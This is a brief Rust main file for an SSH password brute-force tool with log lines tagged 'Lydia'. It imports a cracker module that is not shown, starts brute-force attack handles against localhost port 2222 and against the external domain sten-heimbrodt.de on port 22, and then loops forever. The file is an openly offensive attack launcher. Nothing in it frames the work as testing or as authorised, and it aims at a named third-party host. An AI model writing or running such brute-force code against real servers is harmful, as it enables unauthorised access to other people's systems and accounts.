mod cracker;
use ssh2::Session;
use core::time;
use std::{net::TcpStream, thread};
use colored::Colorize;
use std::io::Write;
use chrono::Local;
use env_logger::Builder;
use log::LevelFilter;
use rand::distr::{Alphanumeric, SampleString};
use cracker::ssh_cracker::create_ssh_brute_attack_handle;


#[tokio::main]
async fn main() {
    Builder::new()
        .format(|buf, record| {
            writeln!(buf,
                "[{}] {} [{}] - {}",
                "Lydia".yellow(),
                Local::now().format("%Y-%m-%dT%H:%M:%S").to_string().blue(),
                record.level(),
                record.args()
            )
        })
        .filter(None, LevelFilter::Info)
        .init();

    create_ssh_brute_attack_handle("127.0.0.1", 2222);
    create_ssh_brute_attack_handle("sten-heimbrodt.de", 22);

    loop {

    }
}
